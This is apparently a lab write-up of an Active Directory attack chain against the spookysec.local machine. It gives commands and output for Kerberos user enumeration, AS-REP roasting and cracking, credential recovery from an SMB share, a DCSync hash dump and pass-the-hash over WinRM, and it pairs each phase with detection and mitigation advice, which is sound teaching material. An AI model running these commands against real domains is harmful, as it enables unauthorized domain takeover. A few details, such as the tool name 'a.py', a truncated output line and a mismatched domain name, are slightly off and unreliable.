Active Directory Attack Path Analysis

w4nn4d13 July 1, 2026

Disclaimer: This content is intended solely for educational purposes and authorized security testing in controlled environments. Unauthorized use against systems you do not own or have explicit permission to test is prohibited.

Introduction

Active Directory (AD) remains the dominant identity and access management solution in enterprise environments, making it a primary target during internal penetration tests. A single misconfigured account or overlooked privilege can cascade into full domain compromise. This article presents a methodical AD attack chain  from an unauthenticated position to complete control over a Windows domain  explaining the underlying technology, the commands used, and the defensive gaps that enable each phase.

The engagement begins with a single IP address and no credentials. The target is a Windows Domain Controller identified by its open ports and service banners. The scenario mirrors common enterprise misconfigurations: legacy authentication settings, weak service account passwords, improper delegation of replication privileges, and reliance on NTLM pass-the-hash vectors.

The following sections walk through each phase of the attack, with an emphasis on the why behind each technique and the how to detect or prevent it.

Network Reconnaissance

Every penetration test begins with discovery. The goal of this phase is to identify the target's role, operating system, domain affiliation, and the services it exposes to the network.

nmap -Pn -p 53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,47001 -sV -T4 <TARGET_IP>

This scan targets the standard Active Directory service ports. Each port corresponds to a specific protocol essential to domain operations:

  • 53/TCP (DNS): Domain Name Service is integral to AD for locating domain controllers and resolving domain resources.
  • 88/TCP (Kerberos): The core authentication protocol for AD. Kerberos issues tickets that grant access to domain resources without re-entering credentials.
  • 135/TCP (RPC Endpoint Mapper): Used by Windows for inter-process communication and service discovery.
  • 389/TCP (LDAP): Lightweight Directory Access Protocol — the primary query interface for reading and writing to the AD database.
  • 445/TCP (SMB): Server Message Block — the file-sharing and named-pipe transport protocol. SMB is frequently abused for enumeration, credential harvesting, and lateral movement.
  • 5985/TCP (WinRM): Windows Remote Management — provides remote PowerShell and command execution capabilities over HTTP.
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
                              (Domain: spookysec.local)
445/tcp   open  microsoft-ds
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)

The LDAP banner leaks the domain name (spookysec.local). The presence of Kerberos, LDAP, and SMB on a single host, combined with port 5985 (WinRM) and 3389 (RDP), identifies this system as a Domain Controller running Windows Server 2019 (build 17763).

Why this matters: Identifying a Domain Controller early informs every subsequent decision. All Kerberos requests, LDAP queries, and SMB interactions will be directed at this host using the discovered domain name.

Domain Enumeration

With the domain name identified, the next step is to verify domain controller properties and confirm the attack surface via SMB negotiation.

netexec smb <TARGET_IP>

The netexec tool (formerly CrackMapExec) sends an SMB protocol negotiation request. The response from the server includes the NetBIOS domain name, the DNS domain name, the hostname, the operating system version, and whether SMB signing is enforced.

SMB         <TARGET_IP>  445  ATTACKTIVEDIREC  [*] Windows 10 / Server 2019 Build 17763 x64
              (name:ATTACKTIVEDIREC) (domain:spookysec.local) (signing:True) (SMBv1:False)

Key findings:

  • Domain: spookysec.local
  • Hostname: ATTACKTIVEDIREC
  • OS Build: 17763 (Windows Server 2019)
  • SMB Signing: Enabled (mutual authentication required for SMB connections)
  • SMBv1: Disabled (a positive security finding — SMBv1 was disabled by default after MS17-010)

SMB signing being enabled means NTLM relay attacks against SMB targets will not work between signed hosts, but it does not prevent authenticated SMB access or Kerberos-based attacks.

User Enumeration

With a domain name but no credentials, the next objective is to discover valid user accounts. Kerberos provides an ideal oracle for this purpose because its error codes differ between existing and non-existing accounts.

Kerberos User Enumeration with Kerbrute

The Kerberos protocol defines specific error messages during the authentication service request (AS-REQ) phase:

  • KRB5KDC_ERR_PREAUTH_REQUIRED (0x25): The user exists but pre-authentication is required. This is the normal response for a valid user.
  • KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN (0x6): The user does not exist in the domain.

These distinct responses allow unauthenticated enumeration of domain users by simply sending AS-REQ messages with candidate usernames and observing the error code returned.

kerbrute userenum -d spookysec.local --dc <TARGET_IP> /wordlists/users.txt

2026/07/01 19:58:31 >  [+] VALID USERNAME:  james@spookysec.local
2026/07/01 19:58:31 >  [+] VALID USERNAME:  svc-admin@spookysec.local
2026/07/01 19:58:31 >  [+] VALID USERNAME:  robin@spookysec.local
2026/07/01 19:58:31 >  [+] VALID USERNAME:  darkstar@spookysec.local
2026/07/01 19:58:31 >  [+] VALID USERNAME:  administrator@spookysec.local
2026/07/01 19:58:31 >  [+] VALID USERNAME:  backup@spookysec.local
2026/07/01 19:58:31 >  [+] VALID USERNAME:  paradox@spookysec.local
2026/07/01 19:58:31 >  [+] VALID USERNAME:  ori@spookysec.local

Eight valid domain users are identified. Among them, svc-admin and backup stand out as potentially privileged service accounts. The administrator account is also confirmed, which is valuable for later pass-the-hash validation.

Why this matters: Without this enumeration step, subsequent AS-REP roasting attempts would be blind. Knowing which accounts exist enables targeted attacks against misconfigured users.

Defensive Consideration

Kerbrute enumeration cannot be prevented by disabling pre-authentication alone — it exploits the fundamental Kerberos error code differentiation. Defenses include:

  • Monitoring Event ID 4768 (Kerberos TGT requested) for anomalous volumes of AS-REQ failures from a single source.
  • Enabling Kerberos armoring (FAST) where supported, which protects the initial AS-REQ exchange.
  • Restricting network access to port 88/TCP to only authorized domain members.

AS-REP Roasting

Background: Kerberos Pre-Authentication

In standard Kerberos authentication, the Authentication Service Request (AS-REQ) includes a timestamp encrypted with the user's NTLM hash. This pre-authentication data proves to the Key Distribution Center (KDC) that the requester knows the user's password before any ticket is issued. If the KDC cannot decrypt the timestamp, it refuses the request.

However, Active Directory allows accounts to be configured with the "Do not require Kerberos pre-authentication" flag (UF_DONT_REQUIRE_PREAUTH). This legacy setting was originally designed for compatibility with non-Windows Kerberos implementations that could not perform pre-authentication. When this flag is set, the KDC will issue an encrypted Ticket Granting Ticket (TGT) to anyone who requests one for that user — without any proof of password knowledge.

The Attack

The TGT returned by the KDC is encrypted with the user's NTLM hash. An attacker who captures this TGT can extract the encrypted portion and attempt to crack it offline using a dictionary or brute-force attack.

a.py spookysec.local/ -dc-ip <TARGET_IP> -usersfile valid_users.txt -request -format hashcat

This tool from the Impacket suite sends an AS-REQ for each user without pre-authentication data. If the user has the DONT_REQUIRE_PREAUTH flag set, the KDC returns an AS-REP containing an encrypted TGT. The output is formatted for Hashcat (mode 18200).

$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:e2ff9604df420fa561af327bfb1f3540$...
[-] User james doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User robin doesn't have UF_DONT_REQUIR_PREAUTH se
...

Only svc-admin has the pre-authentication flag disabled. The returned hash is then cracked using Hashcat in mode 18200 (Kerberos 5 AS-REP etype 23 — RC4-HMAC):

hashcat -m 18200 hash.txt /wordlists/passwords.txt --force

$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:...:management2005

Recovered credential: svc-admin:management2005

Why This Worked

The svc-admin account had two exploitable conditions:

  1. Kerberos pre-authentication disabled — allowing unauthenticated TGT requests.
  2. Weak password (management2005) — the RC4-HMAC hash was cracked near-instantly against a modest wordlist.

Detection

ArtifactSourceEvent ID
Kerberos TGT request without pre-authDomain Controller Security Log4768 (with Pre-Authentication field = false)
AS-REP hash retrieval (TGS-REQ for unusual SPN)Domain Controller4769

Mitigation

  1. Audit all accounts with DONT_REQUIRE_PREAUTH set using PowerShell:

    Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth

  2. Enable pre-authentication on any account that does not require it for legacy compatibility.

  3. Enforce strong password policies for all service accounts.

  4. Use Group Managed Service Accounts (gMSAs) for services where possible.

SMB Enumeration

With valid credentials (spookysec.local\svc-admin:management2005), the next phase is to enumerate accessible resources on the domain controller.

Enumerating Network Shares

SMB shares often contain configuration files, scripts, backups, or other sensitive data. The --shares flag enumerates all available shares and their access permissions.

netexec smb <TARGET_IP> -u 'svc-admin' -p 'management2005' --shares

SMB         <TARGET_IP>  445  ATTACKTIVEDIREC  [+] spookysec.local\svc-admin:management2005
SMB         <TARGET_IP>  445  ATTACKTIVEDIREC  Share           Permissions
SMB         <TARGET_IP>  445  ATTACKTIVEDIREC  -----           -----------
SMB         <TARGET_IP>  445  ATTACKTIVEDIREC  ADMIN$          (Remote Admin)
SMB         <TARGET_IP>  445  ATTACKTIVEDIREC  backup          READ
SMB         <TARGET_IP>  445  ATTACKTIVEDIREC  IPC$            READ
SMB         <TARGET_IP>  445  ATTACKTIVEDIREC  NETLOGON        READ
SMB         <TARGET_IP>  445  ATTACKTIVEDIREC  SYSVOL          READ

The backup share is notable — it is not a default AD share (unlike ADMIN$, C$, NETLOGON, SYSVOL, and IPC$) and appears to be custom-created. It is readable by svc-admin.

Accessing the Backup Share

smbclient //<TARGET_IP>/backup -U 'spookysec.local\svc-admin'

Inside the share, a single file is found:

backup_credentials.txt    (48 bytes)

Downloading and examining the file reveals a Base64-encoded string:

YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw

Base64 is a binary-to-text encoding scheme, not encryption. Decoding is trivial:

backup@spookysec.local:backup2517860

This yields credentials for the backup domain user.

Why This Worked

  • Plaintext credentials were stored in an SMB share accessible to a low-privilege service account.
  • The file used Base64 encoding, which provides no real security — it is easily reversible by anyone with access to the file.
  • The share was readable by svc-admin, which should never have access to backup credentials.

Detection

  • Monitor Event ID 5140 (share object accessed) for anomalous access to non-standard shares.
  • Audit file permission changes on sensitive shares.

Mitigation

  • Never store credentials in SMB shares accessible to non-privileged accounts.
  • Use Windows Credential Manager, LAPS, or a secrets management solution (e.g., HashiCorp Vault).
  • Restrict share permissions using the principle of least privilege.
  • Encrypt sensitive files at rest; Base64 does not constitute encryption.

Privilege Escalation: DCSync

Background: Active Directory Replication

Domain Controllers replicate their database (NTDS.dit) among themselves using the Directory Replication Service (DRS) protocol, exposed via the MS-DRSR RPC interface. This replication mechanism allows DCs to synchronize password hashes, group memberships, and all other directory objects.

Certain accounts — notably those in the Domain Controllers group and accounts delegated with specific replication rights — can initiate replication requests. Two extended rights control this capability:

  • DS-Replication-Get-Changes (GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd1)
  • DS-Replication-Get-Changes-All (GUID: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd1)

An account with these rights can impersonate a Domain Controller and request replication of the entire AD database, including all password hashes. This is the DCSync attack.

Executing DCSync

The backup account was configured with these replication rights. This is a known pattern — backup software often requires the ability to read all directory objects, and the easiest way to grant this is through the "Replicating Directory Changes All" permission on the domain root.

netexec smb <TARGET_IP> -u 'backup' -p 'backup2517860' --ntds

SMB   <TARGET_IP>  445  ATTACKTIVEDIREC  [+] spookysec.local\backup:backup2517860
SMB   <TARGET_IP>  445  ATTACKTIVEDIREC  Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
SMB   <TARGET_IP>  445  ATTACKTIVEDIREC  krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
SMB   <TARGET_IP>  445  ATTACKTIVEDIREC  spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
...
SMB   <TARGET_IP>  445  ATTACKTIVEDIREC  [+] Dumped 18 NTDS hashes

The netexec tool leverages the backup account's replication privileges to request a full copy of the NTDS.dit database. The output contains every domain user's NT hash (the first component after the RID) and LM hash (the first hex string, typically aad3b435b51404eeaad3b435b51404ee indicating "no LM hash stored").

Of particular interest:

  • Administrator NTLM: 0e0363213e37b94221497260b0bcb4fc
  • krbtgt NTLM: 0e2eb8158c27bed09861033026be4c21

The krbtgt hash is especially sensitive — it is used to sign all Kerberos Ticket Granting Tickets in the domain. Compromise of krbtgt enables Golden Ticket attacks, allowing an attacker to forge TGTs for any user (including non-existent ones) indefinitely.

Why This Worked

  • The backup account was granted DS-Replication-Get-Changes-All on the domain root.
  • This is a common misconfiguration when administrators grant backup applications excessive privileges rather than scoping them to specific OUs or using granular delegated permissions.
  • The backup account had a weak password (backup2517860) that could itself be cracked if needed.

Detection

ArtifactSourceEvent ID
DS-Replication-Get-Changes-AllDomain Controller Security Log4662 (Access to an Active Directory object)
Replication attempt from non-DC sourceDirectory Service4928, 4929

The key detection signal is a replication request originating from a non-Domain Controller system. Domain Controllers replicate among themselves as a matter of course, but a workstation or server should never initiate replication.

Mitigation

  1. Audit the Replicating Directory Changes permissions on the domain root:

    Get-ACL "AD:DC=spookysec,DC=local" | Select -ExpandProperty Access | Where {$_.ActiveDirectoryRights -match "Replicating"}

  2. Remove these permissions from all non-DC accounts.

  3. Use dedicated backup solutions that do not require DCSync capabilities (e.g., Windows Server Backup).

  4. Monitor for Event ID 4662 where the AccessMask corresponds to DS-Replication-Get-Changes (0x100).

Pass-the-Hash

Background: NTLM Authentication Flow

NTLM is a challenge-response authentication protocol. The flow is:

  1. The client sends a negotiate message requesting authentication.
  2. The server responds with an 8-byte random challenge.
  3. The client encrypts this challenge using the user's NTLM hash and sends it back as the authenticate message.
  4. The server (or a Domain Controller) independently computes the expected response using the stored NTLM hash and compares.

Critically, the NTLM hash is the only secret needed to compute the correct response. The plaintext password is never required. If an attacker possesses the NTLM hash, they can authenticate as that user without knowing the password.

Pass-the-Hash via WinRM

Windows Remote Management (WinRM) accepts NTLM authentication. With the Administrator's NTLM hash extracted from the DCSync dump, we can authenticate directly:

netexec winrm <TARGET_IP> -u 'Administrator' -H 0e0363213e37b94221497260b0bcb4fc -d 'spookysec.local' -X 'whoami'

WINRM   <TARGET_IP>  5985  <TARGET_IP>  [+] spookysec.local\Administrator (Pwn3d!)
WINRM   <TARGET_IP>  5985  <TARGET_IP>  thm-ad\administrator

The (Pwn3d!) indicator confirms full administrative access on the target. We are now executing commands in the security context of the Domain Administrator.

Why This Worked

  • The NTLM hash was recoverable through the DCSync attack, which was possible because the backup account had excessive replication privileges.
  • WinRM was enabled on the Domain Controller, providing a remote command execution channel.
  • No additional factor (Credential Guard, Just Enough Administration, or network segmentation) prevented hash reuse.

Detection

ArtifactSourceEvent ID
Logon with explicit credentialsTarget System Security Log4648 (if explicit)
Network logon from non-DC hostDomain Controller Security Log4624 (Logon Type 3 or 10)

The most effective detection of pass-the-hash attacks involves monitoring for Logon Type 3 (network logon) events from NTLM where the source workstation is not the expected management host for that target.

Mitigation

  1. Enable Credential Guard — isolates NTLM hashes in a virtualized secure enclave, preventing extraction even from an elevated process.
  2. Restrict WinRM access — configure WinRM firewall rules and TrustedHosts to accept connections only from designated management hosts.
  3. Disable NTLM where possible — configure the domain to use Kerberos only (though legacy compatibility often prevents this).
  4. Implement Privileged Access Workstations (PAWs) — administrative actions must originate from dedicated, hardened workstations.
  5. Use Just Enough Administration (JEA) — limit the commands available to administrative sessions.

Conclusion

This attack chain demonstrates a common but devastating path to full Active Directory compromise that relies on only a handful of misconfigurations:

  1. A service account with pre-authentication disabled and a weak password yields the first credential pair through AS-REP roasting.
  2. Credentials stored in a readable network share provides elevation to a privileged backup account.
  3. Excessive replication permissions on the backup account enables a DCSync attack, dumping all domain password hashes.
  4. NTLM pass-the-hash against WinRM provides immediate Domain Administrator access.

Each of these misconfigurations is individually preventable. The combination, however, creates a kill chain that no single defense can stop. Effective AD security requires a layered approach: strong authentication policies, least-privilege delegation, credential hygiene, and continuous monitoring for the specific behavioral signals outlined in this article.

The most critical takeaway is this: DCSync is the crown jewel. If an attacker reaches this phase, game-over is inevitable. Protecting replication permissions — combined with enabling Credential Guard to prevent hash extraction even from elevated contexts — provides the highest return on defensive investment.
